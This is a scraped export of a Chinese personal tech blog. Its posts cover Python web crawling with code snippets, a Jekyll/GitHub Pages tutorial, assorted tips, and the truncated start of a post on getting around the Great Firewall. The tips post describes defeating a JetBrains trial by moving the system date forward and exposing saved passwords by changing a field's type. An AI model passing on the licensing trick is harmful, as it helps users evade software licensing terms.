title=\"后记\"></a>后记</h2><blockquote>\n<ul>\n<li>想要获得一份好的数据，就要先学爬数据，然而数据的获取方式不止有爬虫，还有通过API来获取，甚至Excel自带的数据导入自网站用起来也不错<ul>\n<li>一份好的数据同样需要好的可视化技术才能看的出来</li>\n<li>想起来《数据之美》里面讲的不要太盲目相信数据，这是对的，就像人类制作超高精度的仪器，超高精度的仪器去制作高精度的，高精度的去制作普通经度的。</li>\n<li>数据对我，有很大的吸引力，很想从中一窥究竟。但是现在觉得更多的是通过数据训练出一个模型，然后再去分析。</li>\n<li>刚才看了厉哥的《我听过最好的评价》，写的真是很厉害啊，对于我现在这个时常迷茫的人大有帮助，谢谢。</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n","categories":["学习数据挖掘的路上"],"tags":["知识回顾"]},{"title":"Talking about Web Spider I","url":"http://iami.xyz/2016/02/03/Python-Web-Spider-I/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>&emsp;&emsp;闲来无事，总结一下自己对爬虫和搜索引擎的认识。作为一个知识回顾，顺便再理一理思路。最开始的时候之所以想使用爬虫，是因为下载东西不方便，后来呢又想自己写一个小型的搜索引擎作为尝试。开始去接触相关的知识，学习python，也逐渐认识到一些库。</p>\n<h2 id=\"我的零开始\"><a href=\"#我的零开始\" class=\"headerlink\" title=\"我的零开始\"></a>我的零开始</h2><h3 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h3><p>访问一个网址，经由DNS服务器解析之后得到相应的ip地址，额，好像没什么关系。但是搜索引擎其实就是将整个互联网上的URL集合进行存储，建立索引。本质也就是一个大的爬虫而已。采取分布式的抓取，定期的更新索引，应该还是多线程的。</p>\n<p> 在访问URL的过程中，你需要先知道 一些HTTP状态码，这些状态码告诉你这些URL代表的页面是否存在，或者已被迁移。常见的有404,200等，当你抓取到不存在的页面时，你需要判断将这个URL放入到哪个序列，未抓取，已抓取，已抓取但未找到（或者是失效的队列），当然往常只有两个队列就是已抓取和未抓取两个队列。</p>\n<h3 id=\"设计一个容器\"><a href=\"#设计一个容器\" class=\"headerlink\" title=\"设计一个容器\"></a>设计一个容器</h3><p> 或者说有一个设计好的代码框架，有入口有出口。入口可以是单个的URL，也可以是一堆的URL，然后分别去下载这些URL对应的页面。当然在你下载了这个页面之后，这才仅仅只是开始了一小步，因为你要做的是获取其中的数据。而不仅仅是下载下来。这时候你需要设计一个解析器，说白了也就是一个函数。想好它将会接收那些参数，又需要返回什么样的结果。我记得之前有次和老师聊天，老师说要学会面向接口编程，上网上查了半天资料也没有找到有用的，当时也没有明白。之后逐渐明白了接口的重要性，你需要设计好一个别人拿来就能用的函数。解析器就应该是这样的。<br>但不仅仅是至进行解析的处理，还应该将异常情况考虑好，怎么抛出怎么处理。</p>\n<p>解析的时候，可以从文件里面进行解析，也可以直接读取保存的字符串变量。解析的时候可以使用正则表达式匹配，这样就很高级了。当然也可以用相应的库来完成这个工作。</p>\n<p>反正我是认为设计模式这个是十分重要的，无论写什么代码，只有将条理理得清清楚楚，知道怎么写，流程往哪里走才行。这样写出来的代码会很少bug。</p>\n<h3 id=\"数据的存储和索引\"><a href=\"#数据的存储和索引\" class=\"headerlink\" title=\"数据的存储和索引\"></a>数据的存储和索引</h3><p>这时候你已经解析好了文件，应该将所需的结果存储起来。其实这里再一步体现了设计的重要性。如果你将这些数据放到文本里就先不说了，但是如果放到数据库中，数据库中的表的设计不也需要仔细想想。假如你爬到的是一些财经的数据，你就按照XX指标，XX点，XX涨幅等等等建个表，那么你的数据库是不是也要考虑一下写上新的事务。</p>\n<p>到了全部存储好了，你需要快速的去查找到这些数据，难道每次都要<code>SELECT * FROM x_TABLE WHERE X_NAME = &#39;$_INPUT&#39;</code>,这样的效率要慢的多，之前没事的时候浅浅的用过solr，虽然只是按着doc玩了一会，但是可以明显的看出来，人家支持各种格式的导入，什么csv,yml,xml,json的，都能直接导进去建立索引，搜索的时候也是很快（当然也可能因为是示例数据少吧，大的数据没试过，好伤心）。期间还学到了其他的好玩的，例如awk,grep，不过sed还是不会用。又蛮开心的。</p>\n<p>写到这的时候突然想，像我这种渣渣，算法菜得一逼，真待补补了。越发觉得算法的重要性，真的是十分重要。算法是魂，绝对是。当然我写的小爬虫可能没有用到，但是但是，TMD算法是真的重要啊。</p>\n<h3 id=\"爬虫和反爬虫技术\"><a href=\"#爬虫和反爬虫技术\" class=\"headerlink\" title=\"爬虫和反爬虫技术\"></a>爬虫和反爬虫技术</h3><p>有人玩爬虫，就有人反爬虫。你一个爬虫请求的速度那么快，假如好多爬虫都去访问人家的网址，那不是坑比了。不过我这种菜菜还领悟不到这种深奥，只说一下知道的最浅薄的吧。</p>\n<blockquote>\n<p>常见的反邮件爬虫的方法就是将邮件地址写成 someaddress AT gmail.com 将@写成AT即可。</p>\n<p>禁止一定时间段内的IP访问次数</p>\n<p>听说还有的是进行大数据建模，分析出是否是人类行为，感觉是十分高大上的。不知道新浪的清理死粉是不是这样做的</p>\n</blockquote>\n<p>至于登陆的时候千奇百怪的验证码技术，也是一个十分好的防爬虫技术。就拿12306的登陆验证码，我相信现在的图片识别技术应该难识别的。</p>\n","categories":["HowTo"],"tags":["知识回顾"]},{"title":"Talking about Web Spider II","url":"http://iami.xyz/2016/02/03/Python-Web-Spider II/","content":"<p><a href=\"http://iami.xyz/Python-Web-Spider-I\">我的零开始</a></p>\n<h2 id=\"一些库的简单使用\"><a href=\"#一些库的简单使用\" class=\"headerlink\" title=\"一些库的简单使用\"></a>一些库的简单使用</h2><ol>\n<li>urllib2(用来下载网页)<br>三种下载网页的方法<blockquote>\n<p>simply</p>\n</blockquote>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"keyword\">import</span> urllib2</span><br><span class=\"line\"></span><br><span class=\"line\">response = urllib2.urlopen(<span class=\"string\">'http://www.aol.com'</span>)         <span class=\"comment\">#直接请求</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> response.getcode()                              <span class=\"comment\">#看看状态码</span></span><br><span class=\"line\"></span><br><span class=\"line\">cont = response.read()                                <span class=\"comment\">#读取内容，可以在前面加个如果状态码有效</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Add Head, data</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib2</span><br><span class=\"line\"></span><br><span class=\"line\">request = urllib2.Request(url)                  <span class=\"comment\">#创建request对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">request.add_data(<span class=\"string\">'xxx'</span>,<span class=\"string\">'xxx'</span>)                   <span class=\"comment\">#增加数据</span></span><br><span class=\"line\"></span><br><span class=\"line\">request.add_header(<span class=\"string\">'User-Agent'</span>, <span class=\"string\">'Mozilla/5.0'</span>)     <span class=\"comment\">#伪装成浏览器</span></span><br><span class=\"line\"></span><br><span class=\"line\">response = urllibe2.urlopen(request)            <span class=\"comment\">#发送请求</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>advance</p>\n<blockquote>\n<p>其实就是Cookie,Proxy,Redirect相关的,分别是HTTPCookieProcessor , ProxyHandler , HTTPRedirectHandler </p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllibe2, cookielib</span><br><span class=\"line\"></span><br><span class=\"line\">cj = cookielib.CookieJar()</span><br><span class=\"line\"></span><br><span class=\"line\">opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))</span><br><span class=\"line\"></span><br><span class=\"line\">urllib2.install_opener(opener)</span><br><span class=\"line\"></span><br><span class=\"line\">response = urllib2.urlopen(<span class=\"string\">\"http://www.google.com/\"</span>)</span><br></pre></td></tr></table></figure>\n<ol>\n<li>Beautifuk Soup (用来解析网页)<blockquote>\n<p>从一个Html网页创建一个Beautiful对象，然后可以搜索节点，find_all,find等可以访问节点的名称和属性。当然配合正则表达式更好</p>\n</blockquote>\n</li>\n</ol>\n<blockquote>\n<blockquote>\n<figure class=\"highlight plain\"><figcaption><span>href</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt;创建beautifulSoup对象</span><br><span class=\"line\">        `from bs4 import BeautifulSoup`    </span><br><span class=\"line\">        `soup = BeautifulSoup( html_doc,  &apos;html.parser&apos;, from_encoding=&apos;utf-8&apos; )`      </span><br><span class=\"line\">&gt;&gt;&gt;搜索节点</span><br><span class=\"line\">&gt;&gt;&gt;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">```python</span><br><span class=\"line\">        find_all(nane, attrs, string)      </span><br><span class=\"line\">        node = soup.find_all(&apos;a&apos;)     </span><br><span class=\"line\">        soup.find_all(&apos;a&apos;, href=&apos;1111.html&apos;)</span><br><span class=\"line\">        soup.find_all(&apos;a&apos;, href= re.compile(r&apos;/view/\\d+\\.htm&apos;))     #正则匹配 </span><br><span class=\"line\">        soup.find_all (&apos;div&apos;, class_= &apos;abc&apos;, string= &apos;Python&apos;)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>访问节点信息<br>&gt;<br>        node.naem<br>        node[‘href’]<br>        node.get_text()</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<ol>\n<li>连接数据库(前提是要安装好数据库)<blockquote>\n<p>PostgreSQL</p>\n</blockquote>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> psycopg2  </span><br><span class=\"line\"></span><br><span class=\"line\">conn = psycopg2.connect(<span class=\"string\">\"dbname='dbname' user='username' host='localhost' password='password'\"</span>)  </span><br><span class=\"line\"></span><br><span class=\"line\">cur = conn.cursor()  </span><br><span class=\"line\"></span><br><span class=\"line\">cur.execute(<span class=\"string\">\"select * from dbtable\"</span>)  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> cur:  </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">print</span> row </span><br><span class=\"line\"></span><br><span class=\"line\"> conn.close()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>ms sql</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> psmssql  </span><br><span class=\"line\"></span><br><span class=\"line\">conn = psmssql.connect(host=<span class=\"string\">'yourhost'</span>, user=<span class=\"string\">'loginname'</span>, password=<span class=\"string\">'password'</span>, database=<span class=\"string\">'dbname'</span>, charset=<span class=\"string\">'utf8'</span>)  </span><br><span class=\"line\"></span><br><span class=\"line\">cur = conn.cursor()  </span><br><span class=\"line\"></span><br><span class=\"line\">cur.execute(<span class=\"string\">'select * from dbtable'</span>)  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> cur:  </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">print</span> row </span><br><span class=\"line\"></span><br><span class=\"line\">conn.close()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>mysql</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> MySQLdb</span><br><span class=\"line\"></span><br><span class=\"line\">conn= MySQLdb.connect( host=<span class=\"string\">'localhost'</span>, port = <span class=\"number\">3306</span>, user=<span class=\"string\">'username'</span>, passwd=<span class=\"string\">'password'</span>, db =<span class=\"string\">'dbname'</span>,)</span><br><span class=\"line\"></span><br><span class=\"line\">cur = conn.cursor()</span><br><span class=\"line\"></span><br><span class=\"line\">cur.execute(<span class=\"string\">\"delete from student where grade &gt; 30\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">cur.close()</span><br><span class=\"line\"></span><br><span class=\"line\">conn.commit()</span><br><span class=\"line\"></span><br><span class=\"line\">conn.close()</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>资料补充</p>\n<p>  <a href=\"http://scrapy.org/\" target=\"_blank\" rel=\"noopener\">Scrapy</a></p>\n<p>  <a href=\"http://www.python-requests.org/\" target=\"_blank\" rel=\"noopener\">Requests</a></p>\n<p>  <a href=\"http://casperjs.org\" target=\"_blank\" rel=\"noopener\">CasperJS/PhantomJS</a></p>\n<p>  <a href=\"https://docs.python.org/3/library/html.parser.html\" target=\"_blank\" rel=\"noopener\">HtmlParser</a></p>\n<p>  <a href=\"http://www.zhihu.com/question/38192299\" target=\"_blank\" rel=\"noopener\">你见过那些瞠目结舌的爬虫技巧-知乎</a></p>\n<p>  还可以使用一些web框架去写爬虫，例如flask，django（手撕包菜用的就是这个）,tornado</p>\n<p>  <a href=\"http://www.tornadoweb.org/en/stable/guide/queues.html\" target=\"_blank\" rel=\"noopener\">Tornado框架的爬虫示例</a><br>  <a href=\"http://nutch.apache.org/\" target=\"_blank\" rel=\"noopener\">Nutch</a></p>\n<p>  当然其他语言也可以写爬虫，java, ruby,php等，还有go啊，js啊</p>\n</li>\n</ul>\n","categories":["HowTo"],"tags":["知识回顾"]},{"title":"Not Only To Build Your Own Github Pages","url":"http://iami.xyz/2016/02/02/Jekyll-and-Markdown/","content":"<h1 id=\"快速构造一个Github-Pages\"><a href=\"#快速构造一个Github-Pages\" class=\"headerlink\" title=\"快速构造一个Github Pages\"></a>快速构造一个Github Pages</h1><h4 id=\"一-使用Github账号新建一个Repository，名称随意，不必要一定是username-github-io\"><a href=\"#一-使用Github账号新建一个Repository，名称随意，不必要一定是username-github-io\" class=\"headerlink\" title=\"一. 使用Github账号新建一个Repository，名称随意，不必要一定是username.github.io\"></a>一. 使用Github账号新建一个Repository，名称随意，不必要一定是username.github.io</h4><h4 id=\"二-进入Setting，选择自动launch-一个Github-Pages，然后选择模板，最后生成直到结束。\"><a href=\"#二-进入Setting，选择自动launch-一个Github-Pages，然后选择模板，最后生成直到结束。\" class=\"headerlink\" title=\"二. 进入Setting，选择自动launch 一个Github Pages，然后选择模板，最后生成直到结束。\"></a>二. 进入Setting，选择自动launch 一个Github Pages，然后选择模板，最后生成直到结束。</h4><h1 id=\"Step-by-Step\"><a href=\"#Step-by-Step\" class=\"headerlink\" title=\"Step by Step\"></a>Step by Step</h1><h2 id=\"1-安装Jekyll\"><a href=\"#1-安装Jekyll\" class=\"headerlink\" title=\"1. 安装Jekyll\"></a>1. 安装Jekyll</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* Install Ruby    </span><br><span class=\"line\">&gt; sudo apt-get install ruby</span><br><span class=\"line\">* Install Gem</span><br><span class=\"line\">&gt; sudo apt-get install rubygems</span><br><span class=\"line\">* Install Jekyll</span><br><span class=\"line\">&gt; gem install jekyll</span><br><span class=\"line\">```               </span><br><span class=\"line\">                </span><br><span class=\"line\"><span class=\"comment\">## 2. 熟悉一下Markdown的语法（推荐ReText编辑器）</span></span><br><span class=\"line\"></span><br><span class=\"line\">首先标题一共有六级，从一级到六级分别用<span class=\"comment\">#，##，...，######表示，像这样：</span></span><br><span class=\"line\">&gt;</span><br><span class=\"line\"><span class=\"comment\"># \\#一级标题 一级标题</span></span><br><span class=\"line\"><span class=\"comment\">## \\##二级标题 二级标题</span></span><br><span class=\"line\"><span class=\"comment\">### \\###三级标题 三级标题</span></span><br><span class=\"line\"></span><br><span class=\"line\">其次，无序列表可以用+ * - 表示,三者的效果哦是相同的，像这样书写：</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;\\* 对酒当歌 </span><br><span class=\"line\"></span><br><span class=\"line\">&gt;\\* 人生几何</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;\\* 譬如朝露</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;\\* 去日苦多</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">* 对酒当歌</span><br><span class=\"line\">* 人生几何</span><br><span class=\"line\">* 譬如朝露</span><br><span class=\"line\">* 去日苦多</span><br><span class=\"line\"></span><br><span class=\"line\">有序列表则需要像这样书写:</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;1.红烧茄子 </span><br><span class=\"line\"></span><br><span class=\"line\">&gt;2.白斩鸡 </span><br><span class=\"line\"></span><br><span class=\"line\">&gt;3.酒鬼花生(注意圆点之后要有一个空格)</span><br><span class=\"line\"></span><br><span class=\"line\">1. 红烧茄子</span><br><span class=\"line\">2. 白斩鸡 </span><br><span class=\"line\">3. 酒鬼花生</span><br><span class=\"line\"></span><br><span class=\"line\">当然对代码的支持也少不了：</span><br><span class=\"line\">可以使用\\```ruby  [Code Here] ```反单引号,也可以使用\\&lt;code&gt;[Code Here]\\&lt;code&gt;,甚至对于单行的代码直接使用一个反单引号即可。还有一种方式是\\&lt;--lang=cpp--&gt;[Code Here]</span><br><span class=\"line\">&lt;code&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"HE,Er Le, Er Le\"</span>);</span><br><span class=\"line\">   </span><br><span class=\"line\">&lt;code&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">    </span><br><span class=\"line\">还有表格![markdownbiaoge](/images//ww.png)这样书写便可得到：</span><br><span class=\"line\"></span><br><span class=\"line\">| name       |   num      | price |</span><br><span class=\"line\">| ------------- |:-------------:| -----:|</span><br><span class=\"line\">| Acer         | 1| <span class=\"variable\">$1600</span> </span><br><span class=\"line\">| MX5         | 2|   <span class=\"variable\">$12</span> </span><br><span class=\"line\">| Boox        | 3|    <span class=\"variable\">$1</span> </span><br><span class=\"line\"></span><br><span class=\"line\">当然你又会问上面的图片是怎么插入的，其实是这样的：  \\!\\[markdownbiaoge\\](/images//ww.png)</span><br><span class=\"line\">也就是：</span><br><span class=\"line\">    ``` ![imgname](imgpath)也可以这样写![imgname][id] [id](imgpath)</span><br></pre></td></tr></table></figure>\n<p>现在你已经熟悉了基本的markdown语法，刚才也把Jekyll安装好了，So,Let’s Try.</p>\n<h2 id=\"3-使用Jekyll构建Github-Pages\"><a href=\"#3-使用Jekyll构建Github-Pages\" class=\"headerlink\" title=\"3. 使用Jekyll构建Github Pages\"></a>3. 使用Jekyll构建Github Pages</h2><h3 id=\"3-1-使用Git并将Repository克隆到本地\"><a href=\"#3-1-使用Git并将Repository克隆到本地\" class=\"headerlink\" title=\"3.1 使用Git并将Repository克隆到本地\"></a>3.1 使用Git并将Repository克隆到本地</h3><h4 id=\"3-1-1-git-clone\"><a href=\"#3-1-1-git-clone\" class=\"headerlink\" title=\"3.1.1 git clone\"></a>3.1.1 git clone</h4><p><code>git clone https://github.com/username/username.github.io.git</code></p>\n<h4 id=\"3-1-2-初始化一个工程并提交\"><a href=\"#3-1-2-初始化一个工程并提交\" class=\"headerlink\" title=\"3.1.2 初始化一个工程并提交\"></a>3.1.2 初始化一个工程并提交</h4><blockquote>\n<p>git init</p>\n<p>git add -A</p>\n<p>git commit -m “Initialize respository”</p>\n<p>git remote add origin git@github.com:<username>/username.github.io.git</username></p>\n<p>git push -u origin –all</p>\n</blockquote>\n<p>前提是你已经将自己机器的ssh key添加进Github了，可以通过<br><code>cat ~/.ssh/id_rsa.pub</code> 查看本机的sshkey，如果没有，自己生成一个即可</p>\n<h4 id=\"3-1-3-checkout是什么鬼\"><a href=\"#3-1-3-checkout是什么鬼\" class=\"headerlink\" title=\"3.1.3 checkout是什么鬼\"></a>3.1.3 checkout是什么鬼</h4><p>checkout可以供你操作分支，例如分支间切换，删除。<br>创建新分支：git branch branchName</p>\n<p>切换到新分支：git checkout branchName</p>\n<p>上面两个命令也可以合成为一个命令：<br>git checkout -b branchName<br>当然更加详细的可以参考<br><a href=\"http://www.open-open.com/lib/view/open1328069889514.html\" target=\"_blank\" rel=\"noopener\">这里</a></p>\n<h3 id=\"3-2-使用Jekyll\"><a href=\"#3-2-使用Jekyll\" class=\"headerlink\" title=\"3.2 使用Jekyll\"></a>3.2 使用Jekyll</h3><p>运行这个命令<code>jekyll new test</code>可以在当前目录下生成一个新的jekyll项目，目录结构大致为<img src=\"/images//jekyllmulu.png\" alt=\"mulu\">：<br>其中_config.yml是配置文件(另yml后缀也是一种数据格式文件，同xml,csv,json一样用来存储数据)，在这个文件中你可以配置你的博客的一些基本内容。<br>而目录下的Sass则支持一种名为SCSS的格式，可以嵌套样式:</p>\n<blockquote>\n<p><code>.center<br>{<br>        text-align: center;<br>            }<br>            .center h1 {<br>                margin-bottom: 10px;<br>            }<br><code><br>使用Sass可以变成这样：<br><code>.center<br>{<br>             text-align: center;<br>                    h1 {<br>                             margin-bottom: 10px; }<br>}<code></code></code></code></code></p>\n</blockquote>\n<p>posts文件夹用来存放要发布的文章，但是命名格式必须要遵循规范。像下面这样即可：<br>    2016-02-02-Jekyll-and-Markdown.md</p>\n<p>同样如果新添加一个类别，则可以新建一个目录，然后在该目录下再新建一个index.md </p>\n<p>Jekyll详细内容：<a href=\"http://jekyll.bootcss.com/\" target=\"_blank\" rel=\"noopener\">教程</a></p>\n<h3 id=\"3-3-本地预览及提交到Github\"><a href=\"#3-3-本地预览及提交到Github\" class=\"headerlink\" title=\"3.3 本地预览及提交到Github\"></a>3.3 本地预览及提交到Github</h3><p>预览直接在你的Jekyll文件目录内运行<code>Jekyll server</code>,然后访问<a href=\"http://127.0.0.1:4000\" target=\"_blank\" rel=\"noopener\">127.0.0.1:4000</a><br>提交直接将修改过的目录push到github即可。</p>\n<blockquote>\n<p><code>git add yourfile</code><br><code>git commit -m &quot;something&quot;</code><br><code>git push</code></p>\n</blockquote>\n<h3 id=\"3-4-自定义域名\"><a href=\"#3-4-自定义域名\" class=\"headerlink\" title=\"3.4 自定义域名\"></a>3.4 自定义域名</h3><p>在你的根目录下新建一个CNAME文件，并填入你的域名地址，然后去运营商那里解析你的域名即可，解析方式有两种。</p>\n<ul>\n<li>一是在新建一个CNAME解析指向当前的Github Pages地址，例如，我的就要指向mylamour.github.io。</li>\n<li>二是新建一个A记录，解析到你当前Github Pages地址的ip地址。两种方法均可以。</li>\n</ul>\n<h1 id=\"FAQ\"><a href=\"#FAQ\" class=\"headerlink\" title=\"FAQ\"></a>FAQ</h1><ol>\n<li><p>Github Pages自定义域名中的问题</p>\n<ul>\n<li>你的CNAME文件必须是大写的</li>\n<li>你的CNAME文件必须是在根目录下</li>\n<li>你的CNAME文件是在master下还是在gh-pages分支下</li>\n<li>二级域名的定义，特殊域名例如xyz,club后缀结尾的等需要注意解析时是@型还是www型</li>\n</ul>\n<ol>\n<li>github提交时fatal: remote origin already exists.<ul>\n<li><code>git remote rm origin</code></li>\n<li><code>git remote add origin git@github.com:username/test.git</code></li>\n</ul>\n</li>\n</ol>\n</li>\n</ol>\n","categories":["HowTo"],"tags":["知识回顾"]},{"title":"小技巧 I","url":"http://iami.xyz/2015/02/23/Something1/","content":"<ul>\n<li>下载东西老是显示文件有危害，无论是任何文件，<br>怎么办呢。直接下载结束的时候改文件名就行了</li>\n</ul>\n<ul>\n<li>浏览器下载的时候网速很慢，那么复制下载链接到迅雷吧。</li>\n</ul>\n<ul>\n<li>记住用不同的搜索引擎搜不同的</li>\n</ul>\n<ul>\n<li><p>想我最开始接触Ubuntu之后，总是折腾，然后图形界面没了，最开始的解决办法是，操作回退，然而没卵用，<br>可以安装其他桌面，重新安装桌面，其实最方便的就是apt-get install xorg-server</p>\n</li>\n<li><p>网页中保存过密码，密码忘了，一是通过浏览器已保存的查看，另外就是直接查看源码，定位到password，把其type改为text即可，一下就能看见</p>\n</li>\n<li><p>碰见收费软件，尤其是jetbrains系列的，哪个115的license server好像不能用了，不过没关系，在激活30天试用前，把电脑日期调到后几十年即可。当然我不提倡盗版，有钱的情况下我会尽量支持正版——————</p>\n</li>\n<li><p>装完ubuntu,开机却是Grub Rescue,那么，首先确定的是已经装上去了，然后看看在哪个分区，设置引导。</p>\n</li>\n</ul>\n<p>&gt;</p>\n<ul>\n<li>set root = (hd0,msdos4) </li>\n</ul>\n<blockquote>\n<ul>\n<li>set prefix = (hd0, msdos4)/usr/grub </li>\n<li>insmod normal normal</li>\n<li>set cmdpath</li>\n</ul>\n<p>等进去之后更新下GRUB即可。</p>\n</blockquote>\n<h2 id=\"—\"><a href=\"#—\" class=\"headerlink\" title=\"—\"></a>—</h2><p>就想起这么多</p>\n","categories":["HowTo"],"tags":["小手段"]},{"title":"教你翻个墙","url":"http://iami.xyz/2015/01/23/CrossGFW/","content":"<h2 id=\"翻墙前：路漫漫其修远兮，吾将上下而求索\"><a href=\"#翻墙前：路漫漫其修远兮，吾将上下而求索\" class=\"headerlink\" title=\"翻墙前：路漫漫其修远兮，吾将上下而求索\"></a>翻墙前：路漫漫其修远兮，吾将上下而求索</h2><p>以下这些算什么呢，心得 or something else，无论什么，这些思考是我的摸索之路。当然，还有<br>一些不在之中。And i want say：“The future like shit， But It’s no need to rush”</p>\n<p>翻墙的方法可以归类为如何寻找资源，毕竟翻墙的过程中以及烦请之后的<br>目的都是为了更多的资源，下面讲讲如何寻找资源</p>\n<p>网络看的见得看不见的更多，这一切都是为人类服务<br>有人的地方就有江湖，同样有江湖的地方就有人<br>有市场的地方也就有人<br>GFW的墙为翻墙业提供了大量的市场，下面先按需求讲讲</p>\n<p>代理，，VPN， 自己搭建，还是购买<br>保密性，速度<br>修改host，反向代理，第三方代理网站？</p>\n<p>我可以怎么找到这些被屏蔽的东西呢？<font 